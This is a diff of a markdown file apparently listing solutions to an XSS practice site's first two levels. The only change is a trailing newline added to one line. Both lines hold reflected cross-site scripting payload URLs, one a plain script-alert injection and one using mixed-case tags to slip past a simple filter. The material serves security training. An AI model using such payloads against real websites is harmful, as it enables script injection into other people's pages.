@@ -1,3 +1,3 @@
-Level 1: [http://www.zixem.altervista.org/XSS/1.php?name=<script>alert(1337)</script>](https://zixem.altervista.org/XSS/1.php?name=%3Cscript%3Ealert(1)%3C/script%3E)
+Level 1: [http://www.zixem.altervista.org/XSS/1.php?name=<script>alert(1337)</script>](https://zixem.altervista.org/XSS/1.php?name=%3Cscript%3Ealert(1)%3C/script%3E) \n
 Level 2: [http://www.zixem.altervista.org/XSS/2.php?name=<scrIpt>alert(1337)</scrIpt>](https://zixem.altervista.org/XSS/2.php?name=%3CscrIpt%3E%20alert(1)%3C/scrIpt%3E)
 
